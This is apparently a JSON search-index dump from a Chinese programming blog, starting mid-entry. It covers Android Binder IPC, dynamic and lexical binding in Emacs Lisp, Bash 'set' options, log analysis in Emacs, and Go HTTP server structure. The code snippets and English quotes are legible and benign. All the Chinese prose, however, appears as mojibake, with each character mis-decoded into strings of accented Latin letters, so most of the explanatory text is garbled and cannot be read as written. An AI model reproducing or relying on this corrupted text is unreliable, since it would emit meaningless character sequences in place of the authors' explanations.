æ–¹æ³•ï¼‰ä¹Ÿå¿…é¡»å®ç°ä¸ºçº¿ç¨‹å®‰å…¨çš„æ–¹æ³•ã€‚\nå‚è€ƒç¤ºæ„å›¾å¦‚ä¸‹ï¼š\nè°ƒç”¨æ—¶åºå›¾ï¼š\nå¦‚å‰æ‰€è¿°ï¼Œå¯¹äº process A æ¥è¯´ï¼Œæ•´ä¸ªè°ƒç”¨æ˜¯ä¸€ä¸ªåŒæ­¥ç­‰å¾…çš„è¿‡ç¨‹ã€‚\nè¿›ç¨‹é—´é€’å½’è°ƒç”¨ Binder ç³»ç»Ÿè¿˜æ”¯æŒè¿›ç¨‹ä¹‹é—´çš„é€’å½’è°ƒç”¨ã€‚ä¾‹å¦‚ï¼š\nå‡è®¾ process A åœ¨ä¸»çº¿ç¨‹å‘ process B å‘èµ·ä¸€ä¸ª transact() è¯·æ±‚ï¼Œæˆ‘ä»¬ç§°ä¸º transact 1 å§ï¼› process B åœ¨è‡ªå·±çš„çº¿ç¨‹æ± ä¸­å¤„ç† binder è¯·æ±‚æ—¶ï¼ˆå³ onTransact() æ–¹æ³•ï¼‰ï¼Œåˆå‘ process A å‘èµ·äº†ä¸€ä¸ª transact() è¯·æ±‚ï¼Œæˆ‘ä»¬ç§°ä¸º transact 2 ï¼› æ­¤æ—¶ process A çš„ä¸»çº¿ç¨‹è¿˜åœ¨ç­‰å¾…è‡ªå·±å‘å‡ºçš„ transact() çš„å“åº”ï¼Œä»å¤„äºé˜»å¡çŠ¶æ€ï¼ˆå‚è€ƒåŒæ­¥è°ƒç”¨ï¼‰ã€‚ä¸è¿‡ç”±äº Android ä¼šè‡ªåŠ¨åœ¨ process A ä¸­ç»´æŠ¤ä¸€ä¸ªçº¿ç¨‹æ± ï¼Œç”¨äºè¿™ç±»å¤„ç† IPC è¯·æ±‚ï¼Œå› æ­¤ transact 2 å¯ä»¥å¾—åˆ°æ­£å¸¸å¤„ç†ï¼Œå¤„ç†å®Œä¹‹åï¼Œæ­£å¸¸è¿”å›åˆ°è¿›ç¨‹ B ä¸­ï¼› è¿”å›è¿›ç¨‹ B åï¼Œç»§ç»­å¤„ç† transact 1, ç„¶åè¿”å› process A, ç»“æŸ transact 1 çš„è°ƒç”¨ã€‚ è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœç³»ç»Ÿä¸ç»´æŠ¤ä¸€ä¸ªçº¿ç¨‹æ± æ¥å¤„ç†è¿™ç±» IPC è¯·æ±‚ï¼Œé‚£åœ¨ process B é€’å½’çš„å‘ process A å‘èµ· IPC è¯·æ±‚æ—¶ï¼Œè¿™ä¸¤ä¸ªè¿›ç¨‹å¯èƒ½å°±è¢«å¡æ­»äº†ã€‚\nä¸Šè¿°è¿‡ç¨‹æ˜¯ä¸æ˜¯æœ‰ç‚¹åƒåœ¨æ¨¡æ‹Ÿä¸€ä¸ªæœ¬åœ°çš„é€’å½’è°ƒç”¨ï¼Ÿäº‹å®ä¸Šï¼Œå’ŒåŒæ­¥è°ƒç”¨ç±»ä¼¼ï¼Œä¹‹æ‰€ä»¥è¿™ä¹ˆè®¾è®¡ï¼Œä¹Ÿæ˜¯ä¸ºäº†å°½é‡è®©ä¸Šå±‚åº”ç”¨å¯¹â€œIPC è°ƒç”¨â€è¿™ä»¶äº‹æƒ…ä¿æŒé€æ˜ï¼Œåº•å±‚å¯ä»¥ä»»æ„åˆ‡æ¢ç»„ä»¶çš„ç‰©ç†å¸ƒå±€ï¼Œè€Œä¸å½±å“ä¸Šå±‚çš„ä¸šåŠ¡è°ƒç”¨ã€‚\nä¸Šè¿°è¿‡ç¨‹å¯ä»¥å‚è€ƒå¦‚ä¸‹æ—¶åºå›¾ï¼š\nè¿œç¨‹å¯¹è±¡ç”Ÿå‘½å‘¨æœŸæ£€æµ‹ å’Œ IBinder è¿™ç±»è¿œç¨‹å¯¹è±¡ååŒå·¥ä½œæ—¶ï¼Œå¾ˆé‡è¦çš„ä¸€ç‚¹æ˜¯å¯¹å…¶ç”Ÿå‘½å‘¨æœŸçš„æ„ŸçŸ¥ã€‚ä¸€æ—¦è¿œç¨‹å¯¹è±¡æ‰€åœ¨çš„è¿›ç¨‹è¢«é”€æ¯äº†ï¼Œè¯¥è¿œç¨‹å¯¹è±¡ä¹Ÿä¼šæˆä¸ºä¸€ä¸ªæ— æ•ˆå¯¹è±¡ã€‚\nç³»ç»Ÿæä¾›äº†å¦‚ä¸‹å‡ ç§æ–¹å¼ç”¨äº IBinder å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸæ£€æµ‹ï¼š\nRemoteException å½“ IBinder å¯¹è±¡æ‰€åœ¨çš„è¿›ç¨‹å·²ç»è¢«é”€æ¯æ—¶ï¼Œè°ƒç”¨ IBinder.transact() æ–¹æ³•ä¼šæŠ›å‡ºè¯¥å¼‚å¸¸ã€‚ IBinder.pingBinder() è¯¥æ–¹æ³•è¿”å› false è¡¨ç¤ºå…¶æ‰€åœ¨è¿›ç¨‹å·²é”€æ¯ã€‚ IBinder.linkToDeath() å¯ç”¨äºæ³¨å†Œä¸€ä¸ª DeathRecipient å¯¹è±¡ï¼Œç”¨æ¥æ¥æ”¶è¿›ç¨‹é”€æ¯æ—¶çš„å›è°ƒã€‚ å‚è€ƒèµ„æ–™ IBinder.java æºç  Binder.java æºç  ","description":"","tags":["android"],"title":"Android çš„ Binder æœºåˆ¶","uri":"/posts/android-binder/"},{"categories":null,"content":"ä»Šå¤©è¯»äº†ä¸€ç¯‡è®² dynamic binding å’Œ lexical binding çš„æ–‡ç« ï¼š Dynamic Binding Vs Lexical Bindingï¼Œè®²çš„æŒºæ¸…æ¥šçš„ï¼Œè¿™é‡Œå¤§è‡´ç¿»è¯‘å¦‚ä¸‹ã€‚\nç»‘å®š binding çš„æ¦‚å¿µ ç»‘å®šæ˜¯åå­—å’Œå€¼çš„ä¸€ç§å¯¹åº”å…³ç³»ã€‚åœ¨ Lisp ä¸­ï¼Œå¯ä»¥ç”¨ let æ¥åˆ›å»ºç»‘å®šï¼š\n1 2 (let ((a 1)) (print a)) ;; ==\u003e 1 è¿™é‡Œå°† name a ç»‘å®šåˆ° value 1 ä¸Šã€‚\nlet è¡¨è¾¾å¼å…¶å®åªæ˜¯ä¸€ä¸ªâ€œè¯­æ³•ç³–â€ï¼Œå’Œ lambda è¡¨è¾¾å¼æ˜¯ç­‰ä»·çš„ã€‚ä¾‹å¦‚ï¼š\n1 2 3 (let ((a 1) (b 3)) (+ a b)) ç­‰ä»·äºï¼š\n1 ((lambda (a b) (+ a b)) 1 3) å½“ç„¶ï¼Œé™¤äº† let ä¹‹å¤–ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„æ–¹æ³•å¯ä»¥åˆ›å»º bindings, ä¾‹å¦‚ defconst, defun, defvar, flet, labels, prog, ç­‰ç­‰ã€‚\nåŠ¨æ€ç»‘å®šå’Œè¯æ³•ç»‘å®š åœ¨å¤„ç†å˜é‡ç»‘å®šæ—¶ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š\ndynamic åŠ¨æ€ç»‘å®šï¼Œæ‰€æœ‰çš„å˜é‡ååŠå®ƒä»¬çš„å€¼éƒ½å­˜åœ¨ä¸€å¼ å…¨å±€è¡¨ä¸­ã€‚ lexical è¯æ³•ç»‘å®šï¼Œæ¯ä¸ªç»‘å®šä½œç”¨åŸŸï¼ˆbinding scopeï¼‰ï¼ŒåŒ…æ‹¬ defun/let ç­‰ï¼Œéƒ½ä¼šåˆ›å»ºä¸€å¼ æ–°çš„è¡¨ï¼Œç”¨äºå­˜æ”¾å˜é‡å’Œå€¼ï¼Œè¿™äº›è¡¨ç»„ç»‡æˆä¸€ä¸ªå±‚æ¬¡ç»“æ„ï¼Œè¢«ç§°ä¸º â€œthe enviromentâ€ã€‚ åœ¨ä¸Šé¢ç»™å‡ºçš„é‚£äº›ç®€å•çš„ä¾‹å­ä¸­ï¼Œlexical å’Œ dynamic binding ä¹‹é—´å¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œè¿”å›çš„ç»“æœæ˜¯ä¸€æ ·çš„ã€‚\nä½†æ˜¯åœ¨ä¸€äº›å¤æ‚æƒ…å†µä¸‹ï¼Œæƒ…å†µåˆ™æœ‰æ‰€ä¸åŒã€‚ä¾‹å¦‚ï¼š\n1 2 3 4 5 6 (let ((a 1)) ; binding (1) (let ((f (lambda () (print a)))) (let ((a 2)) ; binding (2) (funcall f)))) ;; dynamic binding ==\u003e 2 ;; lexical binding ==\u003e 1 å¦‚æœæ˜¯ lexical binding ï¼Œåœ¨è®¿é—®å˜é‡æ—¶ï¼Œä¼šåœ¨ lexical enviroment ä¸­æŸ¥æ‰¾ç»‘å®šï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨å˜é‡çš„ä»£ç å—èŒƒå›´å†…æŸ¥æ‰¾ã€‚å½“åœ¨ lexical enviroment ä¸­æœ‰å¤šä¸ªç»‘å®šåŒæ—¶å­˜åœ¨æ—¶ï¼Œé€‰æ‹©æœ€å†…å±‚çš„é‚£ä¸ªã€‚\nå› æ­¤ï¼Œå¦‚æœæ˜¯ lexical bindingï¼Œä¸Šè¿°ä»£ç ä¼šæ‰“å° â€œ1â€ï¼Œå› ä¸ºåªæœ‰ binding (1) åœ¨ lexical enviroment ä¸­ã€‚\nå¦‚æœæ˜¯ dynamic binding, åœ¨è®¿é—®å˜é‡æ—¶åªä¼šåœ¨ dynamic enviroment ä¸­æŸ¥æ‰¾ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æ‰€æœ‰çš„ç»‘å®šä¸­æŸ¥æ‰¾ï¼ŒåŒ…æ‹¬ä»ç¨‹åºå¯åŠ¨ä¹‹ååˆ›å»ºçš„æ‰€æœ‰ç»‘å®šï¼ˆåªè¦æ²¡è¢«é”€æ¯ï¼‰ã€‚å¦‚æœåŒæ—¶å­˜åœ¨å¤šä¸ªç»‘å®šï¼Œåˆ™ä½¿ç”¨è¿è¡Œæ—¶æœ€è¿‘åˆ›å»ºçš„é‚£ä¸ªï¼ˆæˆ‘æƒ³è¿™å°±æ˜¯ dynamic ä¸€è¯çš„ç”±æ¥ï¼‰ã€‚\nå› æ­¤ï¼Œå¦‚æœæ˜¯ dynamic bindingï¼Œä¸Šè¿°ä»£ç ä¼šæ‰“å° â€œ2â€ï¼Œå› ä¸ºå½“ a æ±‚å€¼æ—¶ï¼Œbinding (1) å’Œ binding (2) éƒ½è¢«åˆ›å»ºäº†ï¼Œä½†æ˜¯ binding (2) æ‰æ˜¯æœ€è¿‘åˆ›å»ºçš„ã€‚\nåœ¨å¤šçº¿ç¨‹ Lisp ä¸­ï¼Œå…³äº dynamic binding æˆ‘ä»¬éœ€è¦æ›´åŠ å°å¿ƒä¸€ç‚¹ï¼Œå› ä¸ºè¦ç¡®ä¿ä¸€ä¸ªçº¿ç¨‹ä¸ä¼šçœ‹åˆ°ï¼ˆè®¿é—®åˆ°ï¼‰å¦ä¸€ä¸ªçº¿ç¨‹æ‰€åˆ›å»ºçš„ bindingsã€‚ç”±äº EmacsLisp æ˜¯å•çº¿ç¨‹çš„ï¼Œæ‰€ä»¥ä¸ç”¨æ‹…å¿ƒã€‚\nåŠ¨æ€ç»‘å®šçš„ä¼˜ç‚¹ åŠ¨æ€ç»‘å®šå¯ä»¥å¾ˆæ–¹ä¾¿çš„ä¿®æ”¹å­ç³»ç»Ÿçš„è¡Œä¸ºã€‚\nè¿™é‡Œä¸¾ä¸€ä¸ªä¾‹å­ã€‚å‡è®¾ä½ æœ‰ä¸€ä¸ª foo çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šåˆ©ç”¨ print äº§ç”Ÿä¸€äº›è¾“å‡ºï¼Œä½ å¸Œæœ›å¯ä»¥å°†è¯¥è¾“å‡ºæ•è·åˆ°ä¸€ä¸ª buffer ä¸­ã€‚é€šè¿‡ dynamic bindingï¼Œå¯ä»¥å¾ˆè½»æ¾çš„å®ç°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ;; get-buffer-create è·å–æˆ–åˆ›å»ºä¸€ä¸ªæŒ‡å®šåå­—çš„ bufferï¼Œæ³¨æ„åå­—å‰é¢æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œè¡¨ ;; ç¤ºè¯¥ buffer ä¸ä¿ç•™ undo å†å² (let ((b (get-buffer-create \" *string-output*\"))) ;; ä¿®æ”¹ standard-output å˜é‡ï¼Œå°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ° buffer b ä¸­ã€‚æ³¨æ„ï¼šè¯¥ä¿®æ”¹ä»…åœ¨ ;; è¯¥ let çš„ä½œç”¨åŸŸèŒƒå›´å†…ç”Ÿæ•ˆ (let ((standard-output b)) ;; è¯¥è¾“å‡ºä¼šé‡å®šå‘åˆ° buffer b ä¸­ (print \"foo\")) ;; åˆ‡æ¢å½“å‰ buffer ä¸º bï¼Œä»…ç”¨äºç¼–è¾‘ï¼Œä¸ä¼šå±•ç¤ºè¯¥ buffer (set-buffer b) (insert \"bar\") ;; è¿”å›å½“å‰ buffer çš„å†…å®¹ (buffer-string)) å¦‚æœä½ ç»å¸¸ä½¿ç”¨ç±»ä¼¼çš„åŠŸèƒ½ï¼Œä½ åº”è¯¥å°†å…¶å°è£…åœ¨ä¸€ä¸ª macro ä¸­ â€”â€” å¹¸è¿çš„æ˜¯ï¼Œå·²ç»æœ‰è¿™æ ·çš„å°è£…äº†ï¼š with-output-to-temp-buffer ã€‚\nç”±äº foo ï¼ˆè¿™é‡Œå…¶å®æ˜¯ print å‡½æ•°ï¼‰ä½¿ç”¨çš„ standard-output æ˜¯ dynamic binding çš„ï¼Œå› æ­¤ä½ å¯ä»¥æ›¿æ¢æˆä½ è‡ªå·±çš„ç»‘å®šï¼Œä»¥æ­¤æ¥ä¿®æ”¹ foo çš„è¡Œä¸º â€”â€” ä»¥åŠ foo æ‰€è°ƒç”¨çš„æ‰€æœ‰ functions çš„è¡Œä¸ºã€‚\nåœ¨ä¸€ä¸ªä¸æ”¯æŒ dynamic binding çš„è¯­è¨€ä¸­ï¼Œä½ å¤§æ¦‚éœ€è¦ç»™ foo å¢åŠ ä¸€ä¸ªå¯é€‰å‚æ•°æ¥æŒ‡å®šä¸€ä¸ª bufferï¼Œç„¶å foo éœ€è¦ä¼ é€’è¯¥å‚æ•°ç»™æ‰€æœ‰çš„ print è°ƒç”¨ã€‚å¦‚æœ foo è¿˜è°ƒç”¨äº†å…¶ä»–å‡½æ•°ï¼Œå¹¶ä¸”è¿™äº›å‡½æ•°ä¹Ÿè°ƒç”¨äº† print ï¼Œé‚£ä¹ˆä½ åŒæ ·éœ€è¦ä¿®æ”¹æ‰€æœ‰è¿™äº›å‚æ•°ï¼ˆæ³¨æ„ï¼šè¿™æ˜¯ä¸€ä¸ªé€’å½’çš„è¿‡ç¨‹ï¼‰ã€‚\nRichard Stallman åœ¨ EmacsLisp çš„ä¸Šä¸‹æ–‡ä¸­è§£é‡Šäº†åŠ¨æ€ç»‘å®šçš„ä¼˜ç‚¹ï¼šEmacs Paper - Dynamic Binding ã€‚å¦è¯·å‚é˜… Pascal Costanza å†™çš„æ–‡ç«  Dynamic vs. Static Typing â€” A Pattern-Based Analysis ã€‚\nè¯æ³•ç»‘å®šçš„ä¼˜ç‚¹ MilesBader çš„è¿™å°é‚®ä»¶è®²çš„å¾ˆæ¸…æ¥šï¼Œè¿™é‡Œæ‘˜æŠ„å¹¶ç¿»è¯‘å¦‚ä¸‹ï¼š\nFrom: MilesBader\nSubject: Re: Emacs 22\nNewsgroups: comp.emacs\nDate: Sun, 19 Aug 2001 01:47:53 GMT\nBecause itâ€™s (1) much easier for the user [that is, programmer], because it eliminates the problem of which variables lambda-expressions use (when they attempt to use variables from their surrounding context), and (2) much easier for the compiler to optimize, because it doesnâ€™t need to worry about variables escaping their lexical context, and so doesnâ€™t need to allow for the possibility (this is a big problem with the current compiler).\nå› ä¸ºå®ƒï¼ˆ1ï¼‰å¯¹äºç¨‹åºå‘˜æ¥è®²ï¼Œè¦ç®€å•å¾ˆå¤šï¼Œå› ä¸ºå®ƒæ¶ˆé™¤äº† lambda è¡¨è¾¾å¼ä½¿ç”¨å“ªäº›å˜é‡çš„é—®é¢˜ï¼ˆå½“ä»–ä»¬å°è¯•ä½¿ç”¨å¤–å›´ç¯å¢ƒçš„å˜é‡æ—¶ï¼‰ï¼Œï¼ˆ2ï¼‰å¯¹äºç¼–è¯‘å™¨æ¥è¯´ï¼Œä¼˜åŒ–èµ·æ¥è¦ç®€å•å¾ˆå¤šï¼Œå› ä¸ºå®ƒä¸éœ€è¦æ‹…å¿ƒå˜é‡ä»è¯æ³•ä¸Šä¸‹æ–‡ä¸­é€ƒé€¸å‡ºå»ï¼Œå› æ­¤ä¸éœ€è¦è€ƒè™‘è¿™ç§é€ƒé€¸å‡ºå»çš„å¯èƒ½æ€§ï¼ˆè¿™æ˜¯å½“å‰ç¼–è¯‘å™¨çš„ä¸€ä¸ªå¤§é—®é¢˜ï¼‰ã€‚\nè¯­è¨€ å¤§éƒ¨åˆ†è¯­è¨€åªæ”¯æŒ lexical binding ã€‚\nEmacsLisp ä» 24.1 ç‰ˆæœ¬å¼€å§‹åŒæ—¶æ”¯æŒ dynamic binding å’Œ lexical binding ã€‚ Lexical binding éœ€è¦åœ¨ä¸€ä¸ªæ–‡ä»¶æˆ– buffer ä¸­æ˜¾å¼å¯ç”¨ï¼ˆè§ä¸‹æ–‡ï¼‰ã€‚é€šè¿‡ defvar å®šä¹‰çš„å˜é‡ä¸ºâ€œspecialâ€å˜é‡ï¼Œå³æ°¸è¿œæ˜¯åŠ¨æ€ç»‘å®šçš„ï¼ˆå³ä½¿è¯¥æ–‡ä»¶å¯ç”¨äº† lexical bindingï¼‰ã€‚ CommonLisp åŒæ—¶æ”¯æŒ dynamic binding å’Œ lexical binding ã€‚ é»˜è®¤ä¸º lexical bindingï¼Œé€šè¿‡ defvar æˆ– declare åˆ›å»ºçš„ä¸€ä¸ªå˜é‡å³ä¸ºâ€œspecialâ€çš„åŠ¨æ€ç»‘å®šå˜é‡ã€‚ ä½¿ç”¨è¯æ³•ç»‘å®š è¦åœ¨ EmacsLisp ä¸­ä½¿ç”¨è¯æ³•ç»‘å®šï¼Œéœ€è¦åœ¨æ–‡ä»¶å¤´ä¸­è®¾ç½® file-local å˜é‡ lexical-binding ä¸º t ï¼Œä¸”å¿…é¡»åœ¨æ–‡ä»¶çš„ç¬¬ä¸€è¡Œä¸­è®¾ç½®ï¼š\n1 ;;; -*- lexical-binding: t -*- ","description":"","tags":["elisp","emacs"],"title":"åŠ¨æ€ç»‘å®šï¼ˆDynamic Bindingï¼‰å’Œè¯æ³•ç»‘å®šï¼ˆLexical Bindingï¼‰","uri":"/posts/dynamic-lexical-binding-in-elisp/"},{"categories":null,"content":"Bash åœ¨æ‰§è¡Œè„šæœ¬çš„æ—¶å€™ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ shell, æ¯ä¸ª shell éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„æ‰§è¡Œç¯å¢ƒï¼Œè¿™ä¸ªç¯å¢ƒä¼šæœ‰ä¸€äº›é»˜è®¤è¡Œä¸ºï¼Œè€Œè¿™äº›é»˜è®¤è¡Œä¸ºå¯ä»¥é€šè¿‡ set å‘½ä»¤æ¥ä¿®æ”¹ã€‚\nè¿™é‡Œä»‹ç»å‡ ç§å¸¸ç”¨çš„ set å‘½ä»¤ã€‚\næ³¨ï¼š set å‘½ä»¤åœ¨ä¸å¸¦å‚æ•°æ‰§è¡Œæ—¶ï¼Œä¼šæ˜¾ç¤ºå½“å‰ shell çš„æ‰€æœ‰ç¯å¢ƒå˜é‡ã€å‡½æ•°ã€‚\nset -u é‡åˆ°ä¸å­˜åœ¨çš„å˜é‡æ—¶æŠ¥é”™ï¼Œå¹¶åœæ­¢æ‰§è¡Œ é»˜è®¤æƒ…å†µä¸‹ï¼Œ bash é‡åˆ°ä¸å­˜åœ¨çš„å˜é‡æ—¶ä¼šå¿½ç•¥ã€‚ä¸ºäº†è®©è„šæœ¬æ›´åŠ ä¸¥è°¨å’Œå®‰å…¨ï¼ŒæŠ¥é”™å¹¶åœæ­¢æ‰§è¡Œæ˜¯ä¸€ç§æ›´å¥½çš„é€‰æ‹©ã€‚\n1 2 3 set -u echo $non_exist_var Output:\n1 bash: line 4: non_exist_var: unbound variable set -x è¿è¡Œå‘½ä»¤ä¹‹å‰ï¼Œå…ˆæ‰“å°å‘½ä»¤æœ¬èº« 1 2 3 4 set -x unameOutput=\"$(uname -s)\" echo $unameOutput Output:\n1 2 3 4 ++ uname -s + unameOutput=Darwin + echo Darwin Darwin set -e å‘ç”Ÿé”™è¯¯æ—¶åŠæ—¶ç»ˆæ­¢è„šæœ¬ é»˜è®¤æƒ…å†µä¸‹ï¼Œè„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸­å¦‚æœå‡ºç°è¿è¡Œå¤±è´¥çš„å‘½ä»¤ï¼Œ Bash ä¼šç»§ç»­æ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œè€Œè¿™å¾€å¾€æ˜¯ä¸å¤ªå®‰å…¨çš„è¡Œä¸ºï¼ˆå› ä¸ºåé¢çš„å‘½ä»¤å¾ˆå¯èƒ½ä¾èµ–å‰é¢å‘½ä»¤çš„æˆåŠŸæ‰§è¡Œï¼‰ã€‚\n1 2 cd /non/exist/path echo \"do something dangerous like rm files\" Output:\n1 2 bash: line 2: cd: /non/exist/path: No such file or directory do something dangerous like rm files å®è·µå½“ä¸­ï¼Œä¸ºäº†é¿å…è¯¥é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨é€»è¾‘è¿ç®—ç¬¦çš„çŸ­è·¯è¡Œä¸ºæ¥åŠæ—¶ç»ˆæ­¢å‘½ä»¤çš„æ‰§è¡Œï¼š\n1 2 cd /non/exist/path || { echo \"/non/exist/path is not found\"; exit 1; } echo \"do something dangerous like rm files\" Output:\n1 2 bash: line 2: cd: /non/exist/path: No such file or directory /non/exist/path is not found è¿™ç§æ‰‹å·¥å¤„ç†çš„æ–¹å¼æ¯”è¾ƒéº»çƒ¦ï¼Œè€Œä¸”å®¹æ˜“é—æ¼ã€‚ set -e å‘½ä»¤å¯ä»¥æ¯”è¾ƒå¥½çš„è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¯¥å‘½ä»¤è®¾ç½®åï¼Œä¸€æ—¦æŸä¸ªå‘½ä»¤å¤±è´¥ï¼Œä¼šç«‹å³åœæ­¢åç»­å‘½ä»¤çš„æ‰§è¡Œã€‚\n1 2 3 4 set -e cd /non/exist/path echo \"do something dangerous like rm files\" Output:\n1 bash: line 4: cd: /non/exist/path: No such file or directory set -o pipefail å¤„ç†ç®¡é“é”™è¯¯ set -e ä¸é€‚ç”¨äºç®¡é“å‘½ä»¤ï¼Œä¾‹å¦‚ï¼š\n1 2 3 4 set -e cat /non/exist/path | echo hello echo world Output:\n1 2 3 hello cat: /non/exist/path: No such file or directory world set -o pipefail å¯ä»¥è§£å†³è¯¥é—®é¢˜ï¼š\n1 2 3 4 set -eo pipefail cat /non/exist/path | echo hello echo world Output:\n1 2 hello cat: /non/exist/path: No such file or directory æ€»ç»“ ä¸Šè¿°å››ä¸ª set å‘½ä»¤å¯ä»¥æŒ‰ç…§å¦‚ä¸‹æ–¹å¼ä¸€èµ·è®¾ç½®ï¼š\n1 2 3 4 5 6 # å†™æ³•ä¸€ set -euxo pipefail # å†™æ³•äºŒ set -eux set -o pipefail å»ºè®®æ”¾åœ¨æ‰€æœ‰ Bash è„šæœ¬å¼€å¤´ã€‚\nå¦å¤–ä¹Ÿå¯ä»¥åœ¨æ‰§è¡Œ Bash è„šæœ¬æ—¶ï¼Œä»å‘½ä»¤è¡Œä¼ å…¥è¿™äº›å‚æ•°ï¼š\n1 bash -euxo pipefail /path/to/script.sh å‚è€ƒèµ„æ–™ The Set Builtin (Bash Reference Manual) Bash è„šæœ¬ set å‘½ä»¤æ•™ç¨‹ - é˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿— ","description":"","tags":["linux","tools","bash"],"title":"Bash: set å‘½ä»¤ç”¨æ³•ä»‹ç»","uri":"/posts/bash-set/"},{"categories":null,"content":"æ—¥å¸¸å¼€å‘å·¥ä½œä¸­ï¼Œç»å¸¸ä¼šéœ€è¦åˆ†ææ—¥å¿—æ–‡ä»¶ï¼Œæœ‰ä¸€ä»¶è¶æ‰‹çš„å·¥å…·ä¼šé«˜æ•ˆå¾ˆå¤šã€‚\nEmacs æ­£æ˜¯è¿™æ ·ä¸€ä¸ªå·¥å…·ã€‚\nVim ä¹Ÿæœ‰ç±»ä¼¼çš„åŠŸèƒ½ï¼ˆå‚è€ƒ Vim Tipsï¼‰ï¼Œä½†å°±åˆ†ææ—¥å¿—æ¥è¯´ï¼Œä¼¼ä¹æ²¡æœ‰ Emacs æ¥å¾—æ–¹ä¾¿ã€‚\nç»Ÿè®¡ \u0026 æœç´¢ M-x count-matches å¯è¾“å…¥æ­£åˆ™è¡¨è¾¾å¼ï¼Œç»Ÿè®¡æ­£åˆ™åŒ¹é…åˆ°çš„æ¬¡æ•°\nC-M-s æ­£åˆ™æœç´¢\nåœ¨è¾“å…¥æ­£åˆ™è¡¨è¾¾å¼æ—¶ï¼Œå¦‚æœéœ€è¦åŒ¹é…æ¢è¡Œç¬¦ï¼Œè¯·è¾“å…¥ C-j ã€‚\næ›¿æ¢ C-M-% query-replace-regexp æ­£åˆ™æ›¿æ¢\nè¿‡æ»¤ M-s o pattern RET åˆ—å‡ºæ‰€æœ‰åŒ¹é…è¡Œ\nkeep-lines ä»…ä¿ç•™åŒ¹é…çš„è¡Œ\nflush-lines å‰”é™¤åŒ¹é…çš„è¡Œ\næå– C-u M-s o pattern RET å°†æ‰€æœ‰åŒ¹é…çš„æ–‡æœ¬ï¼Œå¯¼å‡ºåˆ° *Occur buffer *ä¸­ã€‚è¿™ä¸ªåŠŸèƒ½æŒºæ–¹ä¾¿çš„ï¼Œå¯ä»¥å¿«é€Ÿå°†åŒ¹é…é¡¹æå–åˆ°å¦ä¸€ä¸ª buffer ä¸­ã€‚\n","description":"","tags":["emacs","tools","regexp"],"title":"ç”¨ Emacs åˆ†ææ—¥å¿—æ–‡ä»¶","uri":"/posts/use-emacs-to-analyse-log-files/"},{"categories":null,"content":"ä»Šå¤©è¯»åˆ°ä¸€ç¯‡ä¸é”™çš„æ–‡ç« ï¼Œè®²å¦‚ä½•ç”¨ Go å†™ HTTP æœåŠ¡çš„ï¼Œå¾ˆæœ‰åŒæ„Ÿï¼Œç¿»è¯‘å¦‚ä¸‹ã€‚\nåŸæ–‡é“¾æ¥\nA Server struct ä¸€ä¸ª Server struct æ˜¯ä¸€ä¸ªä»£è¡¨æœåŠ¡çš„å¯¹è±¡ï¼ŒæŒæœ‰æ‰€æœ‰ä¾èµ–ã€‚\næ¯ä¸ªç»„ä»¶éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ server structï¼Œæœ€åçœ‹èµ·æ¥é€šå¸¸ç±»ä¼¼è¿™ä¸ªæ ·å­ï¼š\n1 2 3 4 5 type server struct { db *someDatabase router *someRouter email EmailSender } è¯¥ç»“æ„çš„å­—æ®µä¸»è¦æ˜¯å„ç§éœ€è¦å…±äº«çš„ä¾èµ– routes.go æ¯ä¸ªç»„ä»¶éƒ½æœ‰ä¸€ä¸ª routers.go æ–‡ä»¶ï¼ŒåŒ…å«æ‰€æœ‰çš„è·¯ç”±ï¼š\n1 2 3 4 5 6 7 package app func (s *server) routes() { s.router.HandleFunc(\"/api/\", s.handleAPI()) s.router.HandleFunc(\"/about\", s.handleAbout()) s.router.HandleFunc(\"/\", s.handleIndex()) } ç”±äºå¤§éƒ¨åˆ†ä»£ç ç»´æŠ¤å·¥ä½œéƒ½æ˜¯ä»ä¸€ä¸ª URL å’Œä¸€ä¸ªé”™è¯¯æŠ¥å‘Šå¼€å§‹çš„ï¼Œæ‰€ä»¥åªéœ€è¦çœ‹ä¸€çœ¼ routes.go æ–‡ä»¶ï¼Œå³å¯çŸ¥é“åº”è¯¥å»é‚£é‡ŒæŸ¥æ‰¾é—®é¢˜ã€‚\nHandlers æŒ‚ç€ï¼ˆhang offï¼‰ server å¯¹è±¡ HTTP handlers æŒ‚ç€ server å¯¹è±¡ï¼š\n1 func (s *server) handleSomething() http.HandlerFunc { ... } Handlers å¯ä»¥é€šè¿‡ server å¯¹è±¡è®¿é—®ä¾èµ–ã€‚\nè¿”å› handler Handler å‡½æ•°ä¸ç›´æ¥å¤„ç†è¯·æ±‚ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªå‡½æ•°å¤„ç†ä¹‹ã€‚\nè¿™æ ·æˆ‘ä»¬å°±æœ‰ä¸€ä¸ªé—­åŒ…ç¯å¢ƒï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬çš„ handler å¯ä»¥è¿™æ ·æ“ä½œï¼š\n1 2 3 4 5 6 func (s *server) handleSomething() http.HandlerFunc { thing := prepareThing() return func(w http.ResponseWriter, r *http.Request) { // use the thing } } prepareThing() æ–¹æ³•åªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ï¼Œå› æ­¤ä½ å¯ä»¥ç”¨æ¥æ‰§è¡Œä¸€æ¬¡æ€§çš„ handler åˆå§‹åŒ–åŠ¨ä½œï¼Œç„¶ååœ¨ handler ä¸­ä½¿ç”¨åˆå§‹åŒ–çš„ç»“æœï¼ˆ thing 